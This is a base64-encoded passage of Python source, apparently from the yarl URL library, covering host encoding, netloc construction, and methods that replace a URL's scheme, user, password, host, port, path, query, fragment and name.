IHJlc29sdmVkX3BhdGguYXBwZW5kKCIiKVxyXG5cclxuICAgICAgICByZXR1cm4gIi8iLmpvaW4ocmVzb2x2ZWRfcGF0aClcclxuXHJcbiAgICBpZiBzeXMudmVyc2lvbl9pbmZvID49ICgzLCA3KTpcclxuXHJcbiAgICAgICAgQGNsYXNzbWV0aG9kXHJcbiAgICAgICAgZGVmIF9lbmNvZGVfaG9zdChjbHMsIGhvc3QsIGh1bWFuPUZhbHNlKTpcclxuICAgICAgICAgICAgdHJ5OlxyXG4gICAgICAgICAgICAgICAgaXAsIHNlcCwgem9uZSA9IGhvc3QucGFydGl0aW9uKCIlIilcclxuICAgICAgICAgICAgICAgIGlwID0gaXBfYWRkcmVzcyhpcClcclxuICAgICAgICAgICAgZXhjZXB0IFZhbHVlRXJyb3I6XHJcbiAgICAgICAgICAgICAgICBob3N0ID0gaG9zdC5sb3dlcigpXHJcbiAgICAgICAgICAgICAgICAjIElETkEgZW5jb2RpbmcgaXMgc2xvdyxcclxuICAgICAgICAgICAgICAgICMgc2tpcCBpdCBmb3IgQVNDSUktb25seSBzdHJpbmdzXHJcbiAgICAgICAgICAgICAgICAjIERvblwndCBtb3ZlIHRoZSBjaGVjayBpbnRvIF9pZG5hX2VuY29kZSgpIGhlbHBlclxyXG4gICAgICAgICAgICAgICAgIyB0byByZWR1Y2UgdGhlIGNhY2hlIHNpemVcclxuICAgICAgICAgICAgICAgIGlmIGh1bWFuIG9yIGhvc3QuaXNhc2NpaSgpOlxyXG4gICAgICAgICAgICAgICAgICAgIHJldHVybiBob3N0XHJcbiAgICAgICAgICAgICAgICBob3N0ID0gX2lkbmFfZW5jb2RlKGhvc3QpXHJcbiAgICAgICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgICAgICBob3N0ID0gaXAuY29tcHJlc3NlZFxyXG4gICAgICAgICAgICAgICAgaWYgc2VwOlxyXG4gICAgICAgICAgICAgICAgICAgIGhvc3QgKz0gIiUiICsgem9uZVxyXG4gICAgICAgICAgICAgICAgaWYgaXAudmVyc2lvbiA9PSA2OlxyXG4gICAgICAgICAgICAgICAgICAgIGhvc3QgPSAiWyIgKyBob3N0ICsgIl0iXHJcbiAgICAgICAgICAgIHJldHVybiBob3N0XHJcblxyXG4gICAgZWxzZTpcclxuICAgICAgICAjIHdvcmsgYXJvdW5kIGZvciBtaXNzaW5nIHN0ci5pc2FzY2lpKCkgaW4gUHl0aG9uIDw9IDMuNlxyXG4gICAgICAgIEBjbGFzc21ldGhvZFxyXG4gICAgICAgIGRlZiBfZW5jb2RlX2hvc3QoY2xzLCBob3N0LCBodW1hbj1GYWxzZSk6XHJcbiAgICAgICAgICAgIHRyeTpcclxuICAgICAgICAgICAgICAgIGlwLCBzZXAsIHpvbmUgPSBob3N0LnBhcnRpdGlvbigiJSIpXHJcbiAgICAgICAgICAgICAgICBpcCA9IGlwX2FkZHJlc3MoaXApXHJcbiAgICAgICAgICAgIGV4Y2VwdCBWYWx1ZUVycm9yOlxyXG4gICAgICAgICAgICAgICAgaG9zdCA9IGhvc3QubG93ZXIoKVxyXG4gICAgICAgICAgICAgICAgaWYgaHVtYW46XHJcbiAgICAgICAgICAgICAgICAgICAgcmV0dXJuIGhvc3RcclxuXHJcbiAgICAgICAgICAgICAgICBmb3IgY2hhciBpbiBob3N0OlxyXG4gICAgICAgICAgICAgICAgICAgIGlmIGNoYXIgPiAiXFx4N2YiOlxyXG4gICAgICAgICAgICAgICAgICAgICAgICBicmVha1xyXG4gICAgICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgICAgICByZXR1cm4gaG9zdFxyXG4gICAgICAgICAgICAgICAgaG9zdCA9IF9pZG5hX2VuY29kZShob3N0KVxyXG4gICAgICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICAgICAgaG9zdCA9IGlwLmNvbXByZXNzZWRcclxuICAgICAgICAgICAgICAgIGlmIHNlcDpcclxuICAgICAgICAgICAgICAgICAgICBob3N0ICs9ICIlIiArIHpvbmVcclxuICAgICAgICAgICAgICAgIGlmIGlwLnZlcnNpb24gPT0gNjpcclxuICAgICAgICAgICAgICAgICAgICBob3N0ID0gIlsiICsgaG9zdCArICJdIlxyXG4gICAgICAgICAgICByZXR1cm4gaG9zdFxyXG5cclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIF9tYWtlX25ldGxvYyhcclxuICAgICAgICBjbHMsIHVzZXIsIHBhc3N3b3JkLCBob3N0LCBwb3J0LCBlbmNvZGU9RmFsc2UsIGVuY29kZV9ob3N0PVRydWUsIHJlcXVvdGU9RmFsc2VcclxuICAgICk6XHJcbiAgICAgICAgcXVvdGVyID0gY2xzLl9SRVFVT1RFUiBpZiByZXF1b3RlIGVsc2UgY2xzLl9RVU9URVJcclxuICAgICAgICBpZiBlbmNvZGVfaG9zdDpcclxuICAgICAgICAgICAgcmV0ID0gY2xzLl9lbmNvZGVfaG9zdChob3N0KVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJldCA9IGhvc3RcclxuICAgICAgICBpZiBwb3J0OlxyXG4gICAgICAgICAgICByZXQgPSByZXQgKyAiOiIgKyBzdHIocG9ydClcclxuICAgICAgICBpZiBwYXNzd29yZCBpcyBub3QgTm9uZTpcclxuICAgICAgICAgICAgaWYgbm90IHVzZXI6XHJcbiAgICAgICAgICAgICAgICB1c2VyID0gIiJcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIGlmIGVuY29kZTpcclxuICAgICAgICAgICAgICAgICAgICB1c2VyID0gcXVvdGVyKHVzZXIpXHJcbiAgICAgICAgICAgIGlmIGVuY29kZTpcclxuICAgICAgICAgICAgICAgIHBhc3N3b3JkID0gcXVvdGVyKHBhc3N3b3JkKVxyXG4gICAgICAgICAgICB1c2VyID0gdXNlciArICI6IiArIHBhc3N3b3JkXHJcbiAgICAgICAgZWxpZiB1c2VyIGFuZCBlbmNvZGU6XHJcbiAgICAgICAgICAgIHVzZXIgPSBxdW90ZXIodXNlcilcclxuICAgICAgICBpZiB1c2VyOlxyXG4gICAgICAgICAgICByZXQgPSB1c2VyICsgIkAiICsgcmV0XHJcbiAgICAgICAgcmV0dXJuIHJldFxyXG5cclxuICAgIGRlZiB3aXRoX3NjaGVtZShzZWxmLCBzY2hlbWUpOlxyXG4gICAgICAgICIiIlJldHVybiBhIG5ldyBVUkwgd2l0aCBzY2hlbWUgcmVwbGFjZWQuIiIiXHJcbiAgICAgICAgIyBOLkIuIGRvZXNuXCd0IGNsZWFudXAgcXVlcnkvZnJhZ21lbnRcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShzY2hlbWUsIHN0cik6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiSW52YWxpZCBzY2hlbWUgdHlwZSIpXHJcbiAgICAgICAgaWYgbm90IHNlbGYuaXNfYWJzb2x1dGUoKTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigic2NoZW1lIHJlcGxhY2VtZW50IGlzIG5vdCBhbGxvd2VkIGZvciByZWxhdGl2ZSBVUkxzIilcclxuICAgICAgICByZXR1cm4gVVJMKHNlbGYuX3ZhbC5fcmVwbGFjZShzY2hlbWU9c2NoZW1lLmxvd2VyKCkpLCBlbmNvZGVkPVRydWUpXHJcblxyXG4gICAgZGVmIHdpdGhfdXNlcihzZWxmLCB1c2VyKTpcclxuICAgICAgICAiIiJSZXR1cm4gYSBuZXcgVVJMIHdpdGggdXNlciByZXBsYWNlZC5cclxuXHJcbiAgICAgICAgQXV0b2VuY29kZSB1c2VyIGlmIG5lZWRlZC5cclxuXHJcbiAgICAgICAgQ2xlYXIgdXNlci9wYXNzd29yZCBpZiB1c2VyIGlzIE5vbmUuXHJcblxyXG4gICAgICAgICIiIlxyXG4gICAgICAgICMgTi5CLiBkb2VzblwndCBjbGVhbnVwIHF1ZXJ5L2ZyYWdtZW50XHJcbiAgICAgICAgdmFsID0gc2VsZi5fdmFsXHJcbiAgICAgICAgaWYgdXNlciBpcyBOb25lOlxyXG4gICAgICAgICAgICBwYXNzd29yZCA9IE5vbmVcclxuICAgICAgICBlbGlmIGlzaW5zdGFuY2UodXNlciwgc3RyKTpcclxuICAgICAgICAgICAgdXNlciA9IHNlbGYuX1FVT1RFUih1c2VyKVxyXG4gICAgICAgICAgICBwYXNzd29yZCA9IHZhbC5wYXNzd29yZFxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcigiSW52YWxpZCB1c2VyIHR5cGUiKVxyXG4gICAgICAgIGlmIG5vdCBzZWxmLmlzX2Fic29sdXRlKCk6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoInVzZXIgcmVwbGFjZW1lbnQgaXMgbm90IGFsbG93ZWQgZm9yIHJlbGF0aXZlIFVSTHMiKVxyXG4gICAgICAgIHJldHVybiBVUkwoXHJcbiAgICAgICAgICAgIHNlbGYuX3ZhbC5fcmVwbGFjZShcclxuICAgICAgICAgICAgICAgIG5ldGxvYz1zZWxmLl9tYWtlX25ldGxvYyh1c2VyLCBwYXNzd29yZCwgdmFsLmhvc3RuYW1lLCB2YWwucG9ydClcclxuICAgICAgICAgICAgKSxcclxuICAgICAgICAgICAgZW5jb2RlZD1UcnVlLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgd2l0aF9wYXNzd29yZChzZWxmLCBwYXNzd29yZCk6XHJcbiAgICAgICAgIiIiUmV0dXJuIGEgbmV3IFVSTCB3aXRoIHBhc3N3b3JkIHJlcGxhY2VkLlxyXG5cclxuICAgICAgICBBdXRvZW5jb2RlIHBhc3N3b3JkIGlmIG5lZWRlZC5cclxuXHJcbiAgICAgICAgQ2xlYXIgcGFzc3dvcmQgaWYgYXJndW1lbnQgaXMgTm9uZS5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgIyBOLkIuIGRvZXNuXCd0IGNsZWFudXAgcXVlcnkvZnJhZ21lbnRcclxuICAgICAgICBpZiBwYXNzd29yZCBpcyBOb25lOlxyXG4gICAgICAgICAgICBwYXNzXHJcbiAgICAgICAgZWxpZiBpc2luc3RhbmNlKHBhc3N3b3JkLCBzdHIpOlxyXG4gICAgICAgICAgICBwYXNzd29yZCA9IHNlbGYuX1FVT1RFUihwYXNzd29yZClcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIkludmFsaWQgcGFzc3dvcmQgdHlwZSIpXHJcbiAgICAgICAgaWYgbm90IHNlbGYuaXNfYWJzb2x1dGUoKTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigicGFzc3dvcmQgcmVwbGFjZW1lbnQgaXMgbm90IGFsbG93ZWQgZm9yIHJlbGF0aXZlIFVSTHMiKVxyXG4gICAgICAgIHZhbCA9IHNlbGYuX3ZhbFxyXG4gICAgICAgIHJldHVybiBVUkwoXHJcbiAgICAgICAgICAgIHNlbGYuX3ZhbC5fcmVwbGFjZShcclxuICAgICAgICAgICAgICAgIG5ldGxvYz1zZWxmLl9tYWtlX25ldGxvYyh2YWwudXNlcm5hbWUsIHBhc3N3b3JkLCB2YWwuaG9zdG5hbWUsIHZhbC5wb3J0KVxyXG4gICAgICAgICAgICApLFxyXG4gICAgICAgICAgICBlbmNvZGVkPVRydWUsXHJcbiAgICAgICAgKVxyXG5cclxuICAgIGRlZiB3aXRoX2hvc3Qoc2VsZiwgaG9zdCk6XHJcbiAgICAgICAgIiIiUmV0dXJuIGEgbmV3IFVSTCB3aXRoIGhvc3QgcmVwbGFjZWQuXHJcblxyXG4gICAgICAgIEF1dG9lbmNvZGUgaG9zdCBpZiBuZWVkZWQuXHJcblxyXG4gICAgICAgIENoYW5naW5nIGhvc3QgZm9yIHJlbGF0aXZlIFVSTHMgaXMgbm90IGFsbG93ZWQsIHVzZSAuam9pbigpXHJcbiAgICAgICAgaW5zdGVhZC5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgIyBOLkIuIGRvZXNuXCd0IGNsZWFudXAgcXVlcnkvZnJhZ21lbnRcclxuICAgICAgICBpZiBub3QgaXNpbnN0YW5jZShob3N0LCBzdHIpOlxyXG4gICAgICAgICAgICByYWlzZSBUeXBlRXJyb3IoIkludmFsaWQgaG9zdCB0eXBlIilcclxuICAgICAgICBpZiBub3Qgc2VsZi5pc19hYnNvbHV0ZSgpOlxyXG4gICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJob3N0IHJlcGxhY2VtZW50IGlzIG5vdCBhbGxvd2VkIGZvciByZWxhdGl2ZSBVUkxzIilcclxuICAgICAgICBpZiBub3QgaG9zdDpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigiaG9zdCByZW1vdmluZyBpcyBub3QgYWxsb3dlZCIpXHJcbiAgICAgICAgdmFsID0gc2VsZi5fdmFsXHJcbiAgICAgICAgcmV0dXJuIFVSTChcclxuICAgICAgICAgICAgc2VsZi5fdmFsLl9yZXBsYWNlKFxyXG4gICAgICAgICAgICAgICAgbmV0bG9jPXNlbGYuX21ha2VfbmV0bG9jKHZhbC51c2VybmFtZSwgdmFsLnBhc3N3b3JkLCBob3N0LCB2YWwucG9ydClcclxuICAgICAgICAgICAgKSxcclxuICAgICAgICAgICAgZW5jb2RlZD1UcnVlLFxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgd2l0aF9wb3J0KHNlbGYsIHBvcnQpOlxyXG4gICAgICAgICIiIlJldHVybiBhIG5ldyBVUkwgd2l0aCBwb3J0IHJlcGxhY2VkLlxyXG5cclxuICAgICAgICBDbGVhciBwb3J0IHRvIGRlZmF1bHQgaWYgTm9uZSBpcyBwYXNzZWQuXHJcblxyXG4gICAgICAgICIiIlxyXG4gICAgICAgICMgTi5CLiBkb2VzblwndCBjbGVhbnVwIHF1ZXJ5L2ZyYWdtZW50XHJcbiAgICAgICAgaWYgcG9ydCBpcyBub3QgTm9uZSBhbmQgbm90IGlzaW5zdGFuY2UocG9ydCwgaW50KTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJwb3J0IHNob3VsZCBiZSBpbnQgb3IgTm9uZSwgZ290IHt9Ii5mb3JtYXQodHlwZShwb3J0KSkpXHJcbiAgICAgICAgaWYgbm90IHNlbGYuaXNfYWJzb2x1dGUoKTpcclxuICAgICAgICAgICAgcmFpc2UgVmFsdWVFcnJvcigicG9ydCByZXBsYWNlbWVudCBpcyBub3QgYWxsb3dlZCBmb3IgcmVsYXRpdmUgVVJMcyIpXHJcbiAgICAgICAgdmFsID0gc2VsZi5fdmFsXHJcbiAgICAgICAgcmV0dXJuIFVSTChcclxuICAgICAgICAgICAgc2VsZi5fdmFsLl9yZXBsYWNlKFxyXG4gICAgICAgICAgICAgICAgbmV0bG9jPXNlbGYuX21ha2VfbmV0bG9jKHZhbC51c2VybmFtZSwgdmFsLnBhc3N3b3JkLCB2YWwuaG9zdG5hbWUsIHBvcnQpXHJcbiAgICAgICAgICAgICksXHJcbiAgICAgICAgICAgIGVuY29kZWQ9VHJ1ZSxcclxuICAgICAgICApXHJcblxyXG4gICAgZGVmIHdpdGhfcGF0aChzZWxmLCBwYXRoLCAqLCBlbmNvZGVkPUZhbHNlKTpcclxuICAgICAgICAiIiJSZXR1cm4gYSBuZXcgVVJMIHdpdGggcGF0aCByZXBsYWNlZC4iIiJcclxuICAgICAgICBpZiBub3QgZW5jb2RlZDpcclxuICAgICAgICAgICAgcGF0aCA9IHNlbGYuX1BBVEhfUVVPVEVSKHBhdGgpXHJcbiAgICAgICAgICAgIGlmIHNlbGYuaXNfYWJzb2x1dGUoKTpcclxuICAgICAgICAgICAgICAgIHBhdGggPSBzZWxmLl9ub3JtYWxpemVfcGF0aChwYXRoKVxyXG4gICAgICAgIGlmIGxlbihwYXRoKSA+IDAgYW5kIHBhdGhbMF0gIT0gIi8iOlxyXG4gICAgICAgICAgICBwYXRoID0gIi8iICsgcGF0aFxyXG4gICAgICAgIHJldHVybiBVUkwoc2VsZi5fdmFsLl9yZXBsYWNlKHBhdGg9cGF0aCwgcXVlcnk9IiIsIGZyYWdtZW50PSIiKSwgZW5jb2RlZD1UcnVlKVxyXG5cclxuICAgIEBjbGFzc21ldGhvZFxyXG4gICAgZGVmIF9xdWVyeV9zZXFfcGFpcnMoY2xzLCBxdW90ZXIsIHBhaXJzKTpcclxuICAgICAgICBmb3Iga2V5LCB2YWwgaW4gcGFpcnM6XHJcbiAgICAgICAgICAgIGlmIGlzaW5zdGFuY2UodmFsLCAobGlzdCwgdHVwbGUpKTpcclxuICAgICAgICAgICAgICAgIGZvciB2IGluIHZhbDpcclxuICAgICAgICAgICAgICAgICAgICB5aWVsZCBxdW90ZXIoa2V5KSArICI9IiArIHF1b3RlcihjbHMuX3F1ZXJ5X3Zhcih2KSlcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIHlpZWxkIHF1b3RlcihrZXkpICsgIj0iICsgcXVvdGVyKGNscy5fcXVlcnlfdmFyKHZhbCkpXHJcblxyXG4gICAgQHN0YXRpY21ldGhvZFxyXG4gICAgZGVmIF9xdWVyeV92YXIodik6XHJcbiAgICAgICAgY2xzID0gdHlwZSh2KVxyXG4gICAgICAgIGlmIGlzc3ViY2xhc3MoY2xzLCBzdHIpOlxyXG4gICAgICAgICAgICByZXR1cm4gdlxyXG4gICAgICAgIGlmIGlzc3ViY2xhc3MoY2xzLCBmbG9hdCk6XHJcbiAgICAgICAgICAgIGlmIG1hdGguaXNpbmYodik6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKCJmbG9hdChcJ2luZlwnKSBpcyBub3Qgc3VwcG9ydGVkIilcclxuICAgICAgICAgICAgaWYgbWF0aC5pc25hbih2KTpcclxuICAgICAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoImZsb2F0KFwnbmFuXCcpIGlzIG5vdCBzdXBwb3J0ZWQiKVxyXG4gICAgICAgICAgICByZXR1cm4gc3RyKGZsb2F0KHYpKVxyXG4gICAgICAgIGlmIGlzc3ViY2xhc3MoY2xzLCBpbnQpIGFuZCBjbHMgaXMgbm90IGJvb2w6XHJcbiAgICAgICAgICAgIHJldHVybiBzdHIoaW50KHYpKVxyXG4gICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgIkludmFsaWQgdmFyaWFibGUgdHlwZTogdmFsdWUgIlxyXG4gICAgICAgICAgICAic2hvdWxkIGJlIHN0ciwgaW50IG9yIGZsb2F0LCBnb3QgeyFyfSAiXHJcbiAgICAgICAgICAgICJvZiB0eXBlIHt9Ii5mb3JtYXQodiwgY2xzKVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgX2dldF9zdHJfcXVlcnkoc2VsZiwgKmFyZ3MsICoqa3dhcmdzKTpcclxuICAgICAgICBpZiBrd2FyZ3M6XHJcbiAgICAgICAgICAgIGlmIGxlbihhcmdzKSA+IDA6XHJcbiAgICAgICAgICAgICAgICByYWlzZSBWYWx1ZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgICAgICJFaXRoZXIga3dhcmdzIG9yIHNpbmdsZSBxdWVyeSBwYXJhbWV0ZXIgbXVzdCBiZSBwcmVzZW50IlxyXG4gICAgICAgICAgICAgICAgKVxyXG4gICAgICAgICAgICBxdWVyeSA9IGt3YXJnc1xyXG4gICAgICAgIGVsaWYgbGVuKGFyZ3MpID09IDE6XHJcbiAgICAgICAgICAgIHF1ZXJ5ID0gYXJnc1swXVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIkVpdGhlciBrd2FyZ3Mgb3Igc2luZ2xlIHF1ZXJ5IHBhcmFtZXRlciBtdXN0IGJlIHByZXNlbnQiKVxyXG5cclxuICAgICAgICBpZiBxdWVyeSBpcyBOb25lOlxyXG4gICAgICAgICAgICBxdWVyeSA9ICIiXHJcbiAgICAgICAgZWxpZiBpc2luc3RhbmNlKHF1ZXJ5LCBNYXBwaW5nKTpcclxuICAgICAgICAgICAgcXVvdGVyID0gc2VsZi5fUVVFUllfUEFSVF9RVU9URVJcclxuICAgICAgICAgICAgcXVlcnkgPSAiJiIuam9pbihzZWxmLl9xdWVyeV9zZXFfcGFpcnMocXVvdGVyLCBxdWVyeS5pdGVtcygpKSlcclxuICAgICAgICBlbGlmIGlzaW5zdGFuY2UocXVlcnksIHN0cik6XHJcbiAgICAgICAgICAgIHF1ZXJ5ID0gc2VsZi5fUVVFUllfUVVPVEVSKHF1ZXJ5KVxyXG4gICAgICAgIGVsaWYgaXNpbnN0YW5jZShxdWVyeSwgKGJ5dGVzLCBieXRlYXJyYXksIG1lbW9yeXZpZXcpKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKFxyXG4gICAgICAgICAgICAgICAgIkludmFsaWQgcXVlcnkgdHlwZTogYnl0ZXMsIGJ5dGVhcnJheSBhbmQgbWVtb3J5dmlldyBhcmUgZm9yYmlkZGVuIlxyXG4gICAgICAgICAgICApXHJcbiAgICAgICAgZWxpZiBpc2luc3RhbmNlKHF1ZXJ5LCBTZXF1ZW5jZSk6XHJcbiAgICAgICAgICAgIHF1b3RlciA9IHNlbGYuX1FVRVJZX1BBUlRfUVVPVEVSXHJcbiAgICAgICAgICAgICMgV2UgZG9uXCd0IGV4cGVjdCBzZXF1ZW5jZSB2YWx1ZXMgaWYgd2VcJ3JlIGdpdmVuIGEgbGlzdCBvZiBwYWlyc1xyXG4gICAgICAgICAgICAjIGFscmVhZHk7IG9ubHkgbWFwcGluZ3MgbGlrZSBidWlsdGluIGBkaWN0YCB3aGljaCBjYW5cJ3QgaGF2ZSB0aGVcclxuICAgICAgICAgICAgIyBzYW1lIGtleSBwb2ludGluZyB0byBtdWx0aXBsZSB2YWx1ZXMgYXJlIGFsbG93ZWQgdG8gdXNlXHJcbiAgICAgICAgICAgICMgYF9xdWVyeV9zZXFfcGFpcnNgLlxyXG4gICAgICAgICAgICBxdWVyeSA9ICImIi5qb2luKFxyXG4gICAgICAgICAgICAgICAgcXVvdGVyKGspICsgIj0iICsgcXVvdGVyKHNlbGYuX3F1ZXJ5X3Zhcih2KSkgZm9yIGssIHYgaW4gcXVlcnlcclxuICAgICAgICAgICAgKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJhaXNlIFR5cGVFcnJvcihcclxuICAgICAgICAgICAgICAgICJJbnZhbGlkIHF1ZXJ5IHR5cGU6IG9ubHkgc3RyLCBtYXBwaW5nIG9yICJcclxuICAgICAgICAgICAgICAgICJzZXF1ZW5jZSBvZiAoa2V5LCB2YWx1ZSkgcGFpcnMgaXMgYWxsb3dlZCJcclxuICAgICAgICAgICAgKVxyXG5cclxuICAgICAgICByZXR1cm4gcXVlcnlcclxuXHJcbiAgICBkZWYgd2l0aF9xdWVyeShzZWxmLCAqYXJncywgKiprd2FyZ3MpOlxyXG4gICAgICAgICIiIlJldHVybiBhIG5ldyBVUkwgd2l0aCBxdWVyeSBwYXJ0IHJlcGxhY2VkLlxyXG5cclxuICAgICAgICBBY2NlcHRzIGFueSBNYXBwaW5nIChlLmcuIGRpY3QsIG11bHRpZGljdC5NdWx0aURpY3QgaW5zdGFuY2VzKVxyXG4gICAgICAgIG9yIHN0ciwgYXV0b2VuY29kZSB0aGUgYXJndW1lbnQgaWYgbmVlZGVkLlxyXG5cclxuICAgICAgICBBIHNlcXVlbmNlIG9mIChrZXksIHZhbHVlKSBwYWlycyBpcyBzdXBwb3J0ZWQgYXMgd2VsbC5cclxuXHJcbiAgICAgICAgSXQgYWxzbyBjYW4gdGFrZSBhbiBhcmJpdHJhcnkgbnVtYmVyIG9mIGtleXdvcmQgYXJndW1lbnRzLlxyXG5cclxuICAgICAgICBDbGVhciBxdWVyeSBpZiBOb25lIGlzIHBhc3NlZC5cclxuXHJcbiAgICAgICAgIiIiXHJcbiAgICAgICAgIyBOLkIuIGRvZXNuXCd0IGNsZWFudXAgcXVlcnkvZnJhZ21lbnRcclxuXHJcbiAgICAgICAgbmV3X3F1ZXJ5ID0gc2VsZi5fZ2V0X3N0cl9xdWVyeSgqYXJncywgKiprd2FyZ3MpXHJcbiAgICAgICAgcmV0dXJuIFVSTChcclxuICAgICAgICAgICAgc2VsZi5fdmFsLl9yZXBsYWNlKHBhdGg9c2VsZi5fdmFsLnBhdGgsIHF1ZXJ5PW5ld19xdWVyeSksIGVuY29kZWQ9VHJ1ZVxyXG4gICAgICAgIClcclxuXHJcbiAgICBkZWYgdXBkYXRlX3F1ZXJ5KHNlbGYsICphcmdzLCAqKmt3YXJncyk6XHJcbiAgICAgICAgIiIiUmV0dXJuIGEgbmV3IFVSTCB3aXRoIHF1ZXJ5IHBhcnQgdXBkYXRlZC4iIiJcclxuICAgICAgICBzID0gc2VsZi5fZ2V0X3N0cl9xdWVyeSgqYXJncywgKiprd2FyZ3MpXHJcbiAgICAgICAgbmV3X3F1ZXJ5ID0gTXVsdGlEaWN0KHBhcnNlX3FzbChzLCBrZWVwX2JsYW5rX3ZhbHVlcz1UcnVlKSlcclxuICAgICAgICBxdWVyeSA9IE11bHRpRGljdChzZWxmLnF1ZXJ5KVxyXG4gICAgICAgIHF1ZXJ5LnVwZGF0ZShuZXdfcXVlcnkpXHJcblxyXG4gICAgICAgIHJldHVybiBVUkwoc2VsZi5fdmFsLl9yZXBsYWNlKHF1ZXJ5PXNlbGYuX2dldF9zdHJfcXVlcnkocXVlcnkpKSwgZW5jb2RlZD1UcnVlKVxyXG5cclxuICAgIGRlZiB3aXRoX2ZyYWdtZW50KHNlbGYsIGZyYWdtZW50KTpcclxuICAgICAgICAiIiJSZXR1cm4gYSBuZXcgVVJMIHdpdGggZnJhZ21lbnQgcmVwbGFjZWQuXHJcblxyXG4gICAgICAgIEF1dG9lbmNvZGUgZnJhZ21lbnQgaWYgbmVlZGVkLlxyXG5cclxuICAgICAgICBDbGVhciBmcmFnbWVudCB0byBkZWZhdWx0IGlmIE5vbmUgaXMgcGFzc2VkLlxyXG5cclxuICAgICAgICAiIiJcclxuICAgICAgICAjIE4uQi4gZG9lc25cJ3QgY2xlYW51cCBxdWVyeS9mcmFnbWVudFxyXG4gICAgICAgIGlmIGZyYWdtZW50IGlzIE5vbmU6XHJcbiAgICAgICAgICAgIHJhd19mcmFnbWVudCA9ICIiXHJcbiAgICAgICAgZWxpZiBub3QgaXNpbnN0YW5jZShmcmFnbWVudCwgc3RyKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJJbnZhbGlkIGZyYWdtZW50IHR5cGUiKVxyXG4gICAgICAgIGVsc2U6XHJcbiAgICAgICAgICAgIHJhd19mcmFnbWVudCA9IHNlbGYuX0ZSQUdNRU5UX1FVT1RFUihmcmFnbWVudClcclxuICAgICAgICBpZiBzZWxmLnJhd19mcmFnbWVudCA9PSByYXdfZnJhZ21lbnQ6XHJcbiAgICAgICAgICAgIHJldHVybiBzZWxmXHJcbiAgICAgICAgcmV0dXJuIFVSTChzZWxmLl92YWwuX3JlcGxhY2UoZnJhZ21lbnQ9cmF3X2ZyYWdtZW50KSwgZW5jb2RlZD1UcnVlKVxyXG5cclxuICAgIGRlZiB3aXRoX25hbWUoc2VsZiwgbmFtZSk6XHJcbiAgICAgICAgIiIiUmV0dXJuIGEgbmV3IFVSTCB3aXRoIG5hbWUgKGxhc3QgcGFydCBvZiBwYXRoKSByZXBsYWNlZC5cclxuXHJcbiAgICAgICAgUXVlcnkgYW5kIGZyYWdtZW50IHBhcnRzIGFyZSBjbGVhbmVkIHVwLlxyXG5cclxuICAgICAgICBOYW1lIGlzIGVuY29kZWQgaWYgbmVlZGVkLlxyXG5cclxuICAgICAgICAiIiJcclxuICAgICAgICAjIE4uQi4gRE9FUyBjbGVhbnVwIHF1ZXJ5L2ZyYWdtZW50XHJcbiAgICAgICAgaWYgbm90IGlzaW5zdGFuY2UobmFtZSwgc3RyKTpcclxuICAgICAgICAgICAgcmFpc2UgVHlwZUVycm9yKCJJbnZhbGlkIG5hbWUgdHlwZSIpXHJcbiAgICAgICAgaWYgIi8iIGluIG5hbWU6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIlNsYXNoIGluIG5hbWUgaXMgbm90IGFsbG93ZWQiKVxyXG4gICAgICAgIG5hbWUgPSBzZWxmLl9QQVRIX1FVT1RFUihuYW1lKVxyXG4gICAgICAgIGlmIG5hbWUgaW4gKCIuIiwgIi4uIik6XHJcbiAgICAgICAgICAgIHJhaXNlIFZhbHVlRXJyb3IoIi4gYW5kIC4uIHZhbHVlcyBhcmUgZm9yYmlkZGVuIilcclxuICAgICAgICBwYXJ0cyA9IGxpc3Qoc2VsZi5yYXdfcGFydHMpXHJcbiAgICAgICAgaWYgc2VsZi5pc19hYnNvbHV0ZSgpOlxyXG4gICAgICAgICAgICBpZiBsZW4ocGFydHMpID09IDE6XHJcbiAgICAgICAgICAgICAgICBwYXJ0cy5hcHBlbmQobmFtZSlcclxuICAgICAgICAgICAgZWxzZTpcclxuICAgICAgICAgICAgICAgIHBhcnRzWy0xXSA9IG5hbWVcclxuICAgICAgICAgICAgcGFydHNbMF0gPSAiIiAgIyByZXBsYWNlIGxlYWRpbmcgXCcvXCdcclxuICAgICAgICBlbHNlOlxyXG4gICAgICAgICAgICBwYXJ0c1stMV0gPSBuYW1lXHJcbiAgICAgICAgICAgIGlmIHBhcnRzWzBdID09ICIvIjpcclxuICAgICAgICAgICAgICAgIHBhcnRzWzBdID0gIiIgICMgcmVwbGFj